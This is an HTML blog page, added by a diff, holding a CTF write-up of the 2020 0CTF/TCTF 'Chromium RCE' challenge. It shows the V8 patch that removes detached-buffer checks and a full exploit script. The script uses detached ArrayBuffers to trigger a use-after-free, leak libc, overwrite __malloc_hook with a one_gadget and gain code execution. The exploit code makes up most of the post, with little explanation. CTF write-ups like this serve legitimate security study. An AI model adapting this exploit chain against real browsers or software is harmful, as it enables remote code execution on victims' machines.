@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+<meta name="author" content="mhibio">
+<meta name="description" content="Files .tctf ├── d8 ├── snapshot_blob.bin └── tctf.diff git checkout f7a1932ef928c190de32dd78246f75bd4ca8778b patch.diff diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq index b5c9dcb261..babe7da3f0 100644 --- a/src/builtins/typed-array-set.tq &#43;&#43;&#43; b/src/builtins/typed-array-set.tq @@ -70,7 &#43;70,7 @@ TypedArrayPrototypeSet(  // 7. Let targetBuffer be target.[[ViewedArrayBuffer]]. // 8. If IsDetachedBuffer(targetBuffer) is true, throw a TypeError // exception. - const utarget = typed_array::EnsureAttached(target) otherwise IsDetached; &#43; const utarget = %RawDownCast&lt;AttachedJSTypedArray&gt;(target);  const overloadedArg = arguments[0]; try { @@ -86,8 &#43;86,7 @@ TypedArrayPrototypeSet(  // 10.">
+
+<meta property="og:title" content="[2020 0ctf/tctf] Chromium Rce" />
+<meta property="og:description" content="Files .tctf ├── d8 ├── snapshot_blob.bin └── tctf.diff git checkout f7a1932ef928c190de32dd78246f75bd4ca8778b patch.diff diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq index b5c9dcb261..babe7da3f0 100644 --- a/src/builtins/typed-array-set.tq &#43;&#43;&#43; b/src/builtins/typed-array-set.tq @@ -70,7 &#43;70,7 @@ TypedArrayPrototypeSet(  // 7. Let targetBuffer be target.[[ViewedArrayBuffer]]. // 8. If IsDetachedBuffer(targetBuffer) is true, throw a TypeError // exception. - const utarget = typed_array::EnsureAttached(target) otherwise IsDetached; &#43; const utarget = %RawDownCast&lt;AttachedJSTypedArray&gt;(target);  const overloadedArg = arguments[0]; try { @@ -86,8 &#43;86,7 @@ TypedArrayPrototypeSet(  // 10." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mhibio.github.io/post/2020-0ctf/tctf-chromium-rce/" />
+<meta property="article:published_time" content="2020-05-19T12:50:09+09:00" />
+<meta property="article:modified_time" content="2020-05-19T12:50:09+09:00" />
+
+
+<title>
+
+
+     [2020 0ctf/tctf] Chromium Rce 
+
+</title>
+<link rel="canonical" href="https://mhibio.github.io/post/2020-0ctf/tctf-chromium-rce/">
+
+
+
+
+
+
+
+  
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/styles/default.min.css">
+  
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700|Ubuntu+Mono:400,400i,700,700i|Raleway:500">
+
+
+
+    
+    <link rel="stylesheet" href="https://mhibio.github.io/css/reset.css?t=2021-08-25%2009%3a28%3a53.5441733%20%2b0900%20KST%20m%3d%2b0.290145901">
+    <link rel="stylesheet" href="https://mhibio.github.io/css/pygments.css?t=2021-08-25%2009%3a28%3a53.5441733%20%2b0900%20KST%20m%3d%2b0.290145901">
+    <link rel="stylesheet" href="https://mhibio.github.io/css/main.css?t=2021-08-25%2009%3a28%3a53.5441733%20%2b0900%20KST%20m%3d%2b0.290145901">
+    
+        <link rel="stylesheet" href="https://mhibio.github.io/css/override.css?t=2021-08-25%2009%3a28%3a53.5441733%20%2b0900%20KST%20m%3d%2b0.290145901">
+    
+
+
+
+
+<link rel="shortcut icon"
+
+    href="https://mhibio.github.io/img/favicon.ico"
+
+>
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+<body lang="en">
+
+<section class="header">
+    <div class="container">
+        <div class="content">
+            
+            <a href="https://mhibio.github.io/"><div class="name">mhibio</div></a>
+            
+              <h3 class="self-intro"># Do what I have to do</h3>
+            
+            <nav>
+                <ul>
+                    
+                        
+                        <li class="nav-post"><a href="https://mhibio.github.io/post/"><span>Post</span></a></li>
+                    
+                        
+                        <li class="nav-about"><a href="https://mhibio.github.io/whoami"><span>About</span></a></li>
+                    
+                        
+                        <li class="nav-home"><a href="https://mhibio.github.io/"><span>Home</span></a></li>
+                    
+                        
+                        <li class="nav-intro"><a href="http://rwx.pw"><span>Intro</span></a></li>
+                    
+                </ul>
+            </nav>
+        </div>
+    </div>
+</section>
+
+<section class="icons">
+    <div class="container">
+        <div class="content">
+        
+            <a href="https://github.com/mhibio" target="_blank" rel="noopener"><img class="icon" src="https://mhibio.github.io/img/github.svg" alt="github" /></a>
+        
+
+        
+
+        
+
+	
+
+        
+
+        
+
+        
+
+        
+
+        
+
+        
+            <a href="https://www.instagram.com/moon._.hi_/" target="_blank" rel="noopener"><img class="icon" src="https://mhibio.github.io/img/instagram.svg" alt="instagram" /></a>
+        
+
+        
+
+        
+
+        
+
+        
+        
+        
+
+        
+        </div>
+    </div>
+</section>
+
+
+<section class="main post non-narrow zero-top-spacing">
+    <div class="container">
+        <div class="content">
+            <div class="front-matter">
+                <div class="title-container">
+                    <div class="page-heading">
+
+    [2020 0ctf/tctf] Chromium Rce
+
+</div>
+                    <div class="initials"><a href="https://mhibio.github.io/">ad</a></div>
+                </div>
+
+                <div class=tags-container>
+                
+                  
+                  <span class="tags">
+                    Browser
+                  </span>
+                  
+                  <span class="tags">
+                    Chrome
+                  </span>
+                  
+                  <span class="tags">
+                    v8
+                  </span>
+                  
+                  <span class="tags">
+                    pwnable
+                  </span>
+                  
+                </div>
+                
+                <div class="meta">
+                    
+                    <div class="date" title='Tue May 19 2020 12:50:09 KST'>May 19, 2020</div>
+                    
+                    
+		    <div class="reading-time"><div class="middot"></div>4 minutes read</div>
+                    
+                </div>
+            </div>
+            
+            <div class="markdown">
+                <h2 id="files">Files</h2>
+<pre><code>.tctf
+├── d8
+├── snapshot_blob.bin
+└── tctf.diff
+
+git checkout f7a1932ef928c190de32dd78246f75bd4ca8778b
+</code></pre><h2 id="patchdiff">patch.diff</h2>
+<div class="highlight"><pre class="chroma"><code class="language-diff" data-lang="diff"><span class="gh">diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq
+</span><span class="gh">index b5c9dcb261..babe7da3f0 100644
+</span><span class="gh"></span><span class="gd">--- a/src/builtins/typed-array-set.tq
+</span><span class="gd"></span><span class="gi">+++ b/src/builtins/typed-array-set.tq
+</span><span class="gi"></span><span class="gu">@@ -70,7 +70,7 @@ TypedArrayPrototypeSet(
+</span><span class="gu"></span>     // 7. Let targetBuffer be target.[[ViewedArrayBuffer]].
+     // 8. If IsDetachedBuffer(targetBuffer) is true, throw a TypeError
+     //   exception.
+<span class="gd">-    const utarget = typed_array::EnsureAttached(target) otherwise IsDetached;
+</span><span class="gd"></span><span class="gi">+    const utarget = %RawDownCast&lt;AttachedJSTypedArray&gt;(target);
+</span><span class="gi"></span>
+     const overloadedArg = arguments[0];
+     try {
+<span class="gu">@@ -86,8 +86,7 @@ TypedArrayPrototypeSet(
+</span><span class="gu"></span>       // 10. Let srcBuffer be typedArray.[[ViewedArrayBuffer]].
+       // 11. If IsDetachedBuffer(srcBuffer) is true, throw a TypeError
+       //   exception.
+<span class="gd">-      const utypedArray =
+</span><span class="gd">-          typed_array::EnsureAttached(typedArray) otherwise IsDetached;
+</span><span class="gd"></span><span class="gi">+      const utypedArray = %RawDownCast&lt;AttachedJSTypedArray&gt;(typedArray);
+</span><span class="gi"></span>
+       TypedArrayPrototypeSetTypedArray(
+           utarget, utypedArray, targetOffset, targetOffsetOverflowed)
+<span class="gh">diff --git a/src/d8/d8.cc b/src/d8/d8.cc
+</span><span class="gh">index 117df1cc52..9c6ca7275d 100644
+</span><span class="gh"></span><span class="gd">--- a/src/d8/d8.cc
+</span><span class="gd"></span><span class="gi">+++ b/src/d8/d8.cc
+</span><span class="gi"></span><span class="gu">@@ -1339,9 +1339,9 @@ MaybeLocal&lt;Context&gt; Shell::CreateRealm(
+</span><span class="gu"></span>     }
+     delete[] old_realms;
+   }
+<span class="gd">-  Local&lt;ObjectTemplate&gt; global_template = CreateGlobalTemplate(isolate);
+</span><span class="gd"></span>   Local&lt;Context&gt; context =
+<span class="gd">-      Context::New(isolate, nullptr, global_template, global_object);
+</span><span class="gd"></span><span class="gi">+      Context::New(isolate, nullptr, ObjectTemplate::New(isolate),
+</span><span class="gi">+                   v8::MaybeLocal&lt;Value&gt;());
+</span><span class="gi"></span>   DCHECK(!try_catch.HasCaught());
+   if (context.IsEmpty()) return MaybeLocal&lt;Context&gt;();
+   InitializeModuleEmbedderData(context);
+<span class="gu">@@ -2260,10 +2260,7 @@ void Shell::Initialize(Isolate* isolate, D8Console* console,
+</span><span class="gu"></span>             v8::Isolate::kMessageLog);
+   }
+
+<span class="gd">-  isolate-&gt;SetHostImportModuleDynamicallyCallback(
+</span><span class="gd">-      Shell::HostImportModuleDynamically);
+</span><span class="gd">-  isolate-&gt;SetHostInitializeImportMetaObjectCallback(
+</span><span class="gd">-      Shell::HostInitializeImportMetaObject);
+</span><span class="gd"></span><span class="gi">+  // `import(&#34;xx&#34;)` is not allowed
+</span><span class="gi"></span>
+ #ifdef V8_FUZZILLI
+   // Let the parent process (Fuzzilli) know we are ready.
+<span class="gu">@@ -2285,9 +2282,9 @@ Local&lt;Context&gt; Shell::CreateEvaluationContext(Isolate* isolate) {
+</span><span class="gu"></span>   // This needs to be a critical section since this is not thread-safe
+   base::MutexGuard lock_guard(context_mutex_.Pointer());
+   // Initialize the global objects
+<span class="gd">-  Local&lt;ObjectTemplate&gt; global_template = CreateGlobalTemplate(isolate);
+</span><span class="gd"></span>   EscapableHandleScope handle_scope(isolate);
+<span class="gd">-  Local&lt;Context&gt; context = Context::New(isolate, nullptr, global_template);
+</span><span class="gd"></span><span class="gi">+  Local&lt;Context&gt; context = Context::New(isolate, nullptr,
+</span><span class="gi">+                                        ObjectTemplate::New(isolate));
+</span><span class="gi"></span>   DCHECK(!context.IsEmpty());
+   if (i::FLAG_perf_prof_annotate_wasm || i::FLAG_vtune_prof_annotate_wasm) {
+     isolate-&gt;SetWasmLoadSourceMapCallback(ReadFile);
+
+<span class="gh">diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h
+</span><span class="gh">index 3519599a88..f1ba0fb445 100644
+</span><span class="gh"></span><span class="gd">--- a/src/parsing/parser-base.h
+</span><span class="gd"></span><span class="gi">+++ b/src/parsing/parser-base.h
+</span><span class="gi"></span><span class="gu">@@ -1907,10 +1907,8 @@ ParserBase&lt;Impl&gt;::ParsePrimaryExpression() {
+</span><span class="gu"></span>       return ParseTemplateLiteral(impl()-&gt;NullExpression(), beg_pos, false);
+
+     case Token::MOD:
+<span class="gd">-      if (flags().allow_natives_syntax() || extension_ != nullptr) {
+</span><span class="gd">-        return ParseV8Intrinsic();
+</span><span class="gd">-      }
+</span><span class="gd">-      break;
+</span><span class="gd"></span><span class="gi">+      // Directly call %ArrayBufferDetach without `--allow-native-syntax` flag
+</span><span class="gi">+      return ParseV8Intrinsic();
+</span><span class="gi"></span>
+     default:
+       break;
+
+<span class="gh">diff --git a/src/parsing/parser.cc b/src/parsing/parser.cc
+</span><span class="gh">index 9577b37397..2206d250d7 100644
+</span><span class="gh"></span><span class="gd">--- a/src/parsing/parser.cc
+</span><span class="gd"></span><span class="gi">+++ b/src/parsing/parser.cc
+</span><span class="gi"></span><span class="gu">@@ -357,6 +357,11 @@ Expression* Parser::NewV8Intrinsic(const AstRawString* name,
+</span><span class="gu"></span>   const Runtime::Function* function =
+       Runtime::FunctionForName(name-&gt;raw_data(), name-&gt;length());
+
+<span class="gi">+  // Only %ArrayBufferDetach allowed
+</span><span class="gi">+  if (function-&gt;function_id != Runtime::kArrayBufferDetach) {
+</span><span class="gi">+    return factory()-&gt;NewUndefinedLiteral(kNoSourcePosition);
+</span><span class="gi">+  }
+</span><span class="gi">+
+</span><span class="gi"></span>   // Be more permissive when fuzzing. Intrinsics are not supported.
+   if (FLAG_fuzzing) {
+     return NewV8RuntimeFunctionForFuzzing(function, args, pos);
+</code></pre></div><p>Directly call <code>%ArrayBufferDetach</code> without <code>--allow-native-syntax</code> flag<br>
+only <code>%ArrayBufferDetach</code> is possible.</p>
+<h2 id="new-arraybuffersize">new ArrayBuffer(size);</h2>
+<p><code>new ArrayBuffer(size);</code> use <code>calloc</code>.</p>
+<h2 id="solvejs">Solve.js</h2>
+<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">function</span> <span class="nx">test</span><span class="p">(</span><span class="nx">victim</span><span class="p">,</span> <span class="nx">header</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">victim</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">body</span><span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x1000000</span><span class="p">;</span>
+    <span class="nx">victim</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="nx">body</span> <span class="o">&amp;</span> <span class="mh">0xffffff00</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="nx">header</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x1000000</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x1000000</span>
+    <span class="nx">victim</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="nx">header</span> <span class="o">&amp;</span> <span class="mh">0xff00</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cm">/*
+</span><span class="cm">function test(victim, header, body) {
+</span><span class="cm">		victim[4] = 0x41000000;
+</span><span class="cm">		victim[5] = 0x41414141
+</span><span class="cm">		victim[6] = 0x41
+</span><span class="cm">	}
+</span><span class="cm">*/</span>
+
+<span class="nx">t</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x40</span><span class="p">);</span>
+<span class="nx">t1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">t</span><span class="p">);</span>
+
+<span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x50</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">test</span><span class="p">(</span><span class="nx">t1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="c1">// create JIT
+</span><span class="c1"></span>
+<span class="nx">a1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x500</span><span class="p">);</span>
+<span class="nx">a2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x500</span><span class="p">);</span>
+
+<span class="nx">b1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">a1</span><span class="p">);</span>
+<span class="nx">b2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">a2</span><span class="p">);</span>
+<span class="c1">// calloc 2 times
+</span><span class="c1"></span>
+<span class="o">%</span><span class="nx">ArrayBufferDetach</span><span class="p">(</span><span class="nx">a1</span><span class="p">);</span>
+
+<span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
+
+<span class="nx">b2</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">b1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="c1">// leak
+</span><span class="c1"></span>
+<span class="nx">header</span> <span class="o">=</span> <span class="nx">b2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="nx">leak</span> <span class="o">=</span> <span class="nx">b2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x3ec0f0</span> <span class="o">+</span> <span class="mh">0x20</span>
+<span class="nx">body</span> <span class="o">=</span> <span class="nx">leak</span> <span class="o">+</span> <span class="mh">0x4f2c5</span><span class="p">;</span>
+
+<span class="nx">libc</span> <span class="o">=</span> <span class="p">((</span><span class="nx">b2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">*</span> <span class="mh">0x100000000</span><span class="p">)</span> <span class="o">+</span> <span class="nx">leak</span><span class="p">);</span>
+<span class="nx">one_gadget</span> <span class="o">=</span> <span class="nx">libc</span> <span class="o">+</span> <span class="mh">0x4f2c5</span>
+<span class="nx">__malloc_hook</span> <span class="o">=</span> <span class="nx">libc</span> <span class="o">+</span> <span class="mh">0x3ebc30</span><span class="p">;</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[*] [LIBC_HEADER] : 0x&#39;</span> <span class="o">+</span> <span class="nx">header</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[*] [LIBC] : 0x&#39;</span><span class="o">+</span><span class="nx">libc</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[*] [ONESHOT] : 0x&#39;</span><span class="o">+</span><span class="nx">one_gadget</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[*] [__MALLOC_HOOK] : 0x&#39;</span><span class="o">+</span><span class="nx">__malloc_hook</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="nx">z1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
+<span class="nx">z2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
+<span class="nx">z3</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
+<span class="nx">z4</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
+<span class="nx">z5</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
+<span class="nx">z6</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
+<span class="nx">z7</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
+
+<span class="nx">k1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="nx">z1</span><span class="p">);</span>
+<span class="nx">k2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="nx">z2</span><span class="p">);</span>
+<span class="nx">k3</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="nx">z3</span><span class="p">);</span>
+<span class="nx">k4</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="nx">z4</span><span class="p">);</span>
+<span class="nx">k5</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="nx">z5</span><span class="p">);</span>
+<span class="nx">k6</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="nx">z6</span><span class="p">);</span>
+<span class="nx">k7</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="nx">z7</span><span class="p">);</span>
+
+<span class="o">%</span><span class="nx">ArrayBufferDetach</span><span class="p">(</span><span class="nx">z1</span><span class="p">);</span>
+<span class="o">%</span><span class="nx">ArrayBufferDetach</span><span class="p">(</span><span class="nx">z2</span><span class="p">);</span>
+<span class="o">%</span><span class="nx">ArrayBufferDetach</span><span class="p">(</span><span class="nx">z3</span><span class="p">);</span>
+<span class="o">%</span><span class="nx">ArrayBufferDetach</span><span class="p">(</span><span class="nx">z4</span><span class="p">);</span>
+<span class="o">%</span><span class="nx">ArrayBufferDetach</span><span class="p">(</span><span class="nx">z5</span><span class="p">);</span>
+<span class="o">%</span><span class="nx">ArrayBufferDetach</span><span class="p">(</span><span class="nx">z6</span><span class="p">);</span>
+<span class="o">%</span><span class="nx">ArrayBufferDetach</span><span class="p">(</span><span class="nx">z7</span><span class="p">);</span>
+
+<span class="c1">// escape tcache for calloc
+</span><span class="c1"></span><span class="nx">t1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
+<span class="nx">t2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
+<span class="nx">q1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">t1</span><span class="p">);</span>
+<span class="nx">q2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">t2</span><span class="p">);</span>
+
+<span class="o">%</span><span class="nx">ArrayBufferDetach</span><span class="p">(</span><span class="nx">t1</span><span class="p">);</span>
+
+<span class="nx">q2</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">q1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+<span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">q2</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nx">q2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">__malloc_hook</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x23</span>
+<span class="nx">q2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">header</span>
+
+<span class="nx">q1</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">q2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="c1">// __malloc_hook - 0x23 allocation
+</span><span class="c1"></span>
+<span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
+<span class="nx">victim</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x60</span><span class="p">));</span>
+<span class="c1">// malloc_trigger
+</span><span class="c1"></span>
+<span class="nx">test</span><span class="p">(</span><span class="nx">victim</span><span class="p">,</span> <span class="nx">header</span><span class="p">,</span> <span class="nx">body</span><span class="p">);</span>
+<span class="c1">// BOOM
+</span><span class="c1"></span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[-] [DEBUG]&#34;</span><span class="p">);</span> 
+<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</code></pre></div>
+                <br>
+                <p class="back-to-posts"><a href="https://mhibio.github.io/post">Back to posts</a></p>
+            </div>
+            <br>
+            <div class="disqus">
+                
+            </div>
+            
+        </div>
+    </div>
+</section>
+
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-123-45', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/highlight.min.js"></script>
+    
+  
+  <script type="text/javascript">
+    hljs.initHighlightingOnLoad();
+  </script>
+
+
+
+
+
+</body>
+</html>
+
